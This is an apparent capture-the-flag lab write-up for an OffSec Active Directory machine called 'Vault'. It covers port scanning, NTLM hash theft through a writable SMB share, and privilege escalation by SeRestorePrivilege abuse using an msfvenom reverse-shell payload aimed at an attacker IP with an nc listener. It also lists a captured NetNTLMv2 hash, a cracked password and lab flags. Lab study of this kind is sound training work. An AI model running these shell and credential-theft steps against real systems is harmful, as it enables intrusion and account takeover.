# Vault \[Hard]

## Report



## Enumeration

192.168.247.172

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-05 12:17:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Issuer: commonName=DC.vault.offsec
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-05T12:17:49+00:00
|_ssl-date: 2025-11-05T12:18:29+00:00; +13s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**SMB**

RPC binned

```
SMB         192.168.247.172 445    DC               DocumentsShare  READ,WRITE
```

LDAP too no luck

DNS also failed

NTLM cred stealing the way im calling it

### Files

None

### Initial Foothold

Uploading files to SMB share that steal NTLM creds gives us creds for 'anirudh'

## PrivEsc

{% hint style="info" %}
SeBackupPrivilege, SeRestorePrivilege, and SeMachineAccountPrivilege are all very juicy
{% endhint %}

```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Backup didn't work (all 3 methods from raj)

The easy one - admin account doesn't have remote access, confirm by checking members of RDP group

SeRestore did

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80`

`.\SeRestoreAbuse.exe C:\Temp\reverse.exe [Absolute path]`

`nc -lvnp 80`

## Loot

### Creds

anirudh::VAULT:75c3bfb54ab3fa38:AE735948BF1DBB378FEDCF8223505976:01010000000000000035DB33264EDC0164347CC5A78305170000000002000800490049004900550001001E00570049004E002D0039004900330039004900460056004A0057003100510004003400570049004E002D0039004900330039004900460056004A005700310051002E0049004900490055002E004C004F00430041004C000300140049004900490055002E004C004F00430041004C000500140049004900490055002E004C004F00430041004C00070008000035DB33264EDC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310033000000000000000000

`anirudh:SecureHM`

### Flags

local:3b5de59248cedf311c8949f1fd74457a

proof:0c28a4a2a32507578aa4b6df33e5ebc9

## Proof

{% embed url="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" %}

Notice the output of our groups, we're not a group owner right so we wouldn't clock it

Our internal enumeration is horrible

{% embed url="https://gowthamarajr.medium.com/red-teaming-ad-enumeration-gpo-acl-8ad59095bb4e" %}
Find what all GPOs are there in the first place
{% endembed %}

```
.\powerview.ps1

Get-GPO -Name "Default Domain Policy"
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

What are our permissions?

```
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
```

SharpGPOAbuse.exe - we've done this before remember?
